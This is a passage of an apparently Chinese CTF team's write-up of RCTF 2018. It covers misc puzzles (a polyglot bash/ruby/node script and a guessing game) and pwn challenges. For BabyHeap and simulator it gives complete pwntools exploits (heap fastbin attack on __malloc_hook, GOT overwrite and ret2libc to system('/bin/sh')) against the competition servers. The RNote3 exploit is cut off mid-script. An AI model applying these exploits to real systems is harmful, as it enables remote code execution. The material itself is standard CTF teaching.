src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/9b5eb04927e849c1bd6fbd2feddfb683.png?raw=true"></p><h3><span id="cats"><strong>cats</strong></span></h3><p>题目要求找出15个命令xxx，使得xxx food的输出结果等于cat food的输出结果</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/eb3e5cd84262f334aaeee23d7cf61631.png?raw=true"></p><p>在本地docker测试可以免掉验证码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'food'</span>&gt;yourCatFood</span><br><span class="line">docker run -it --rm --network none -v /tmp/yourCatFood:/app/food:ro rctf_cats bash -c <span class="string">"timeout 5 diff -Z &lt;(cat food) &lt;(xxxx food)"</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/9c75906c72bcf8c128c1eb2cfd3e9985.png?raw=true"></p><p>后来想到把food内容也设置为`food`，这样cat food就等于ls food等于echo food了，用这种方法找出15个可用的命令，然后拿到flag</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/296f3fd8e9eb37e77a139e777661c73b.png?raw=true"></p><h3><span id="cats-rev2"><strong>cats Rev.2</strong></span></h3><p>在1的基础上</p><p>If you can find at least 4 out of 5 cats whose names in (python3, bash, php, node, ruby), I will give you another flag ._.</p><p>看来就是命令绕过了，1中只用到了php</p><p>一开始陷入误区，打算用软链接来替换掉命令</p><p>如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"ln -s /bin/cat /usr/local/sbin/gg"</span>)</span><br><span class="line">f=open(<span class="string">'food'</span>,<span class="string">'r'</span>)</span><br><span class="line">data=f.read()</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p>提交python3,gg,.....</p><p>但是，后来发现应该是将所有cat的名字分别代入到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -it --rm --network none -v /tmp/yourCatFood:/app/food:ro</span><br><span class="line">rctf_cats bash -c <span class="string">"timeout 5 diff -Z \&lt;(cat food) \&lt;(yourCatName food)"</span></span><br></pre></td></tr></table></figure><p>所以，每个环境都是独立的，相互不影响，所以需要写一个脚本是（python3,bash,node,ruby）中3个运行输出与cat一样的（php只要不写”&lt;?php”，直接原样输出）。</p><p>跟cat一致，那就是读取文件内容并输出了。</p><p>python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(open(<span class="string">'food'</span>).read());</span><br></pre></td></tr></table></figure><p>ruby</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(open(<span class="string">'food'</span>).read());</span><br></pre></td></tr></table></figure><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat food</span><br></pre></td></tr></table></figure><p>node</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fs=require(&apos;fs&apos;);</span><br><span class="line">var data=fs.readFileSync(&apos;food&apos;,&apos;utf-8&apos;);</span><br><span class="line">console.log(data);</span><br></pre></td></tr></table></figure><p>接下来是考虑整合了。</p><p>通过解析的差异和适当的exit来整合。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> cat food;</span><br></pre></td></tr></table></figure><p>在bash下输出文件内容，在ruby、node下无输出</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(open(<span class="string">'food'</span>).read());</span><br></pre></td></tr></table></figure><p>ruby运行OK，node运行报函数未定义，so，定义下函数</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function print(data)&#123;</span><br><span class="line">fs=<span class="keyword">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">var data=fs.readFileSync(<span class="string">'food'</span>,<span class="string">'utf-8'</span>);</span><br><span class="line">console.log(data);</span><br><span class="line">&#125;</span><br><span class="line">function open(filename)&#123;<span class="keyword">return</span> &#123;<span class="symbol">read:</span>function()&#123;&#125;&#125;&#125;</span><br><span class="line">function exit()&#123;&#125;</span><br></pre></td></tr></table></figure><p>所以，结合起来</p><p>本地测试的时候，node是要去掉后面的回车 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> cat food;</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">exit</span>;</span><br><span class="line"><span class="built_in">print</span>(open(<span class="string">'food'</span>).<span class="built_in">read</span>());<span class="built_in">exit</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">print</span>(data)&#123;</span><br><span class="line">fs=require(<span class="string">'fs'</span>);</span><br><span class="line">var data=fs.readFileSync(<span class="string">'food'</span>,<span class="string">'utf-8'</span>);</span><br><span class="line">console.log(data.slice(0,-1));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> open(filename)&#123;<span class="built_in">return</span> &#123;<span class="built_in">read</span>:<span class="function"><span class="title">function</span></span>()&#123;&#125;&#125;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">exit</span></span>()&#123;&#125;</span><br></pre></td></tr></table></figure></p><p>但是，答题那里不用去掉末尾的回车，要改成 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> cat food;</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">exit</span>;</span><br><span class="line"><span class="built_in">print</span>(open(<span class="string">'food'</span>).<span class="built_in">read</span>());<span class="built_in">exit</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">print</span>(data)&#123;</span><br><span class="line">fs=require(<span class="string">'fs'</span>);</span><br><span class="line">var data=fs.readFileSync(<span class="string">'food'</span>,<span class="string">'utf-8'</span>);</span><br><span class="line">console.log(data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> open(filename)&#123;<span class="built_in">return</span> &#123;<span class="built_in">read</span>:<span class="function"><span class="title">function</span></span>()&#123;&#125;&#125;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">exit</span></span>()&#123;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/57aebfb432b41b85d1894f00d6063487.png?raw=true"></p><h3><span id="number-game"><strong>Number Game</strong></span></h3><p>o__ <strong>o o</strong> <strong>o </strong>__o<strong> <strong>o</strong></strong> o__ <strong>o</strong>/_</p><p>&lt;| v  /v v  /   /   &lt;| v</p><p>/   &lt;  /&gt; &lt;  / &lt; &gt;</p><p>/ o/ o/ | |</p><p>|__ _&lt;| &lt;| &lt; &gt; o__/_</p><p>|     | |</p><p><o>   / o <o></o></o></p><p>| v  o o &lt;| |</p><p>/   &lt;  &lt;__ __/&gt; /   /<br></p><p>In every round of the game, I'll choose some different numbers from the figure interval. You are required to guess those numbers,ofc so does the order of them.</p><p>On each surmise of yours, 2 numbers will be told as a hint for you, but you need to speculate the fuctions of these 2 figures. (XD</p><p>GLHF</p><p>================== round 1 ==================</p><p>Give me 4 numbers, in[0, 10), You can only try 6 times</p><p><a href="https://github.com/AustinGuo/GessNumber" class="uri" target="_blank" rel="noopener">https://github.com/AustinGuo/GessNumber</a> 脚本可以生成每关结果，然后半自动玩游戏23333</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/4c4908ebc3b82ac6238fd66afc6589d7.png?raw=true"></p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/f9708038d6e6b7d0ab66c1904333d700.png?raw=true"></p><h3><span id="520gift"><strong>520gift</strong></span></h3><p>找出美妆博主：</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/38c8c75e5339fe38e6f0988c08a2fbd7.png?raw=true"></p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/b3281fd10858de25b21222735d1a5e03.png?raw=true"></p><p>flag：<strong>RCTF{rbdlmlombrslj}</strong></p><h2><span id="0x02-pwn">0x02 Pwn</span></h2><h3><span id="babyheap"><strong>BabyHeap</strong></span></h3><p>最基础的off by null</p><p>chunk overlap + fastbin attack 极限利用.....做起来很不舒服......</p><p>思路首先是利用off by null来chunk overlap ， chunk overlap之后利用fast bin attack来get shell，基本上全是套路......... <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">e=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p=process(<span class="string">'./babyheap'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'babyheap.2018.teamrois.cn'</span>,<span class="number">3154</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">p.send(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(sz,content)</span>:</span></span><br><span class="line">se(<span class="string">'1\n'</span>)</span><br><span class="line">ru(<span class="string">'please input chunk size:'</span>)</span><br><span class="line">se(str(sz)+<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'input chunk content:'</span>)</span><br><span class="line">se(content)</span><br><span class="line">ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">se(<span class="string">'2\n'</span>)</span><br><span class="line">ru(<span class="string">'please input chunk index:'</span>)</span><br><span class="line">se(str(idx)+<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'content: '</span>)</span><br><span class="line">data=ru(<span class="string">'1. '</span>)</span><br><span class="line">ru(<span class="string">'choice:'</span>)</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">se(<span class="string">'3\n'</span>)</span><br><span class="line">ru(<span class="string">'please input chunk index:'</span>)</span><br><span class="line">se(str(idx)+<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------init----------------</span></span><br><span class="line">alloc(<span class="number">0x48</span>,<span class="string">'0\n'</span>)</span><br><span class="line">alloc(<span class="number">0xf9</span>,(p64(<span class="number">0x100</span>)+p64(<span class="number">0x21</span>))*<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0xa8</span>,<span class="string">'2'</span>*<span class="number">8</span>+p64(<span class="number">0x21</span>)*<span class="number">10</span>+<span class="string">'\n'</span>)</span><br><span class="line">alloc(<span class="number">0x100</span>,<span class="string">'3\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------off by null-------------</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">0x48</span>,<span class="string">'a'</span>*<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------chunk overlap--------</span></span><br><span class="line">alloc(<span class="number">0x88</span>,<span class="string">'1\n'</span>)</span><br><span class="line">alloc(<span class="number">0x68</span>,<span class="string">'4\n'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak libc----------------</span></span><br><span class="line">alloc(<span class="number">0x88</span>,<span class="string">'1\n'</span>)</span><br><span class="line"></span><br><span class="line">libc=u64(show(<span class="number">4</span>)[:<span class="number">6</span>]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">base=libc<span class="number">-0x3C4B78</span></span><br><span class="line"></span><br><span class="line">malloc_hook=base+e.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------fast bin attack-----------</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0xa8</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+p64(<span class="number">0x71</span>)+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0xa8</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>)+<span class="string">'\n'</span>)</span><br><span class="line">alloc(<span class="number">0x68</span>,<span class="string">'t\n'</span>)</span><br><span class="line">alloc(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(base+<span class="number">0xf1147</span>)*<span class="number">2</span>+p64(base+<span class="number">0x846D0</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line"></span><br><span class="line">print(hex(base+<span class="number">0x846D0</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>flag: <strong>RCTF{Let_us_w4rm_up_with_a_e4sy_NU11_byte_overflow_lul_7adf58}</strong></p><h3><span id="simulator"><strong>simulator</strong></span></h3><p>这是一个mips的指令模拟器，先输入mips的汇编代码，然后会解析成二进制，之后根据二进制来执行对应的操作，在主函数那里貌似有一个栈溢出，但是leak不出来cookie…….</p><p>基本操作有这些，syscall 只实现了一个，就是print int，感觉可以利用lw 和sw进行任意地址读写</p><p>然后将 ___stack_chk_fail 的got 写改成 ret 的地址，就可以用栈溢出随便玩了</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/2d4bbc0310f5f97ce15c1e45996656d8.png?raw=true"></p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/4953625cac69b7d60dd6c1ba1febd22a.png?raw=true"></p><p>漏洞点在这里，没有判断小于0的情况</p><p>li $a0,1883262208<br>li $a1,1883262209<br>add $a0,$a0,$a1<br>lw $a0,$a0</p><p>li $v0,1</p><p>syscall</p><p>END</p><p>利用这个payload可以打印got中某个地址的值</p><p>这里可以劫持控制流</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">li $a0,1883262209</span><br><span class="line">li $a1,1883262210</span><br><span class="line">add $a1,$a0,$a1</span><br><span class="line">move $a0,$a1</span><br><span class="line">lw $a0,$a0</span><br><span class="line">li $v0,1</span><br><span class="line">syscall</span><br><span class="line">move $a0,$a1</span><br><span class="line">li $v0,134523991</span><br><span class="line">sw $v0,$a0</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>输完这个payload之后，就可以栈溢出</p><p>弄了半天ret2dlresolve，然后发现找libc快多了..........</p><p>下面是payload <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> roputils</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">rop=roputils.ROP(<span class="string">'./simulator'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p=process(<span class="string">'simulator'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">e=ELF(<span class="string">'/lib/i386-linux-gnu/libc-2.24.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'simulator.2018.teamrois.cn'</span>, <span class="number">3131</span>)</span><br><span class="line">e=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">p.send(x)</span><br><span class="line"></span><br><span class="line">s=string.letters+string.digits</span><br><span class="line"><span class="keyword">if</span> debug==<span class="number">0</span>:</span><br><span class="line">chal=p.recv(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(s,<span class="number">4</span>):</span><br><span class="line">    sol=<span class="string">''</span>.join(i)</span><br><span class="line">    <span class="keyword">if</span> sha256(chal + sol).digest().startswith(<span class="string">'\0\0\0'</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p.send(sol)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'''</span></span><br><span class="line"><span class="string">li $a0,1883262209</span></span><br><span class="line"><span class="string">li $a1,1883262210</span></span><br><span class="line"><span class="string">add $a1,$a0,$a1</span></span><br><span class="line"><span class="string">move $a0,$a1</span></span><br><span class="line"><span class="string">lw $a0,$a0</span></span><br><span class="line"><span class="string">li $v0,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">move $a0,$a1</span></span><br><span class="line"><span class="string">li $v0,134523991</span></span><br><span class="line"><span class="string">sw $v0,$a0</span></span><br><span class="line"><span class="string">END</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">se(payload)</span><br><span class="line"></span><br><span class="line">puts=<span class="number">0x080485C0</span></span><br><span class="line">main_addr=<span class="number">0x804AC23</span></span><br><span class="line">bss_tmp=<span class="number">0x804DB20</span>+<span class="number">0x100</span></span><br><span class="line">pret=<span class="number">0x804B33B</span></span><br><span class="line"></span><br><span class="line">tpayload=<span class="string">'a'</span>*<span class="number">44</span>+p32(bss_tmp)+p32(puts)+p32(main_addr)+p32(<span class="number">0x0804D010</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'leave a comment: '</span>)</span><br><span class="line">se(tpayload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">printf=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">base=printf-e.symbols[<span class="string">'printf'</span>]</span><br><span class="line"></span><br><span class="line">system=base+e.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh=base+e.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">rpayload=<span class="string">'a'</span>*<span class="number">48</span>+p32(system)+p32(binsh)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">se(rpayload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>flag: **RCTF{5imu_s1mu_sinnu_siml_l_simulator!_7a3dac}**</p><h3><span id="rnote3"><strong>RNote3</strong></span></h3><p>漏洞在delete那里.....未初始化变量......看了栈溢出那里半天....难受</p><p>delete函数未初始化变量，所以可以delete 任意一块地方</p><p>具体是先view了某一个想delete的堆，然后堆地址保存在栈上，然后这个时候进delete函数，随便输一个东西，然后因为找不到对应的堆，然后 i 这个时候是31，但是free的是栈上面的那个变量，所以可以use after free，之后一个fastbin attack过去就可以了</p><p>payload 如下 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">e=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p=process(<span class="string">'RNote3'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'rnote3.2018.teamrois.cn'</span>,<span class="number">7322</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(title,sz,content)</span>:</span></span><br><span class="line">se(<span class="string">'1\n'</span>)</span><br><span class="line">ru(<span class="string">'please input title:'</span>)</span><br><span class="line">se(title)</span><br><span class="line">ru(<span class="string">'please input content size:'</span>)</span><br><span class="line">se(str(sz)+<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'please input content:'</span>)</span><br><span class="line">se(content)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(title)</span>:</span></span><br><span class="line">se(<span class="string">'2\n'</span>)</span><br><span class="line">ru(<span class="string">'please input note title: '</span>)</span><br><span class="line">se(title)</span><br><span class="line">ru(<span class="string">'note content: '</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(title,content)</span>:</span></span><br><span class="line">se(<span class="string">'3\n'</span>)</span><br><span class="line">ru(<span class="string">'please input note title:'</span>)</span><br><span class="line">se(title)</span><br><span class="line">ru(<span class="string">'please input new content: '</span>)</span><br><span class="line">se(content)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(title)</span>:</span></span><br><span class="line">se(<span class="string">'4\n'</span>)</span><br><span class="line">ru(<span class="string">'please input note title: '</span>)</span><br><span class="line">se(title)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">'1\n'</span>,<span class="number">0xa0</span>,<span class="string">'a\n'</span>)</span><br><span class="line">add(<span class="string">'2\n'</span>,<span class="number">0xa0</span>,<span class="string">'b\n'</span>)</span><br><span class="line">show(<span class="string">'1\n'</span>)</span><br><span class="line">delete(<span class="string">'a\n'</span>)</span><br><span class="line">show(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">libc=u64(p.recv(<span 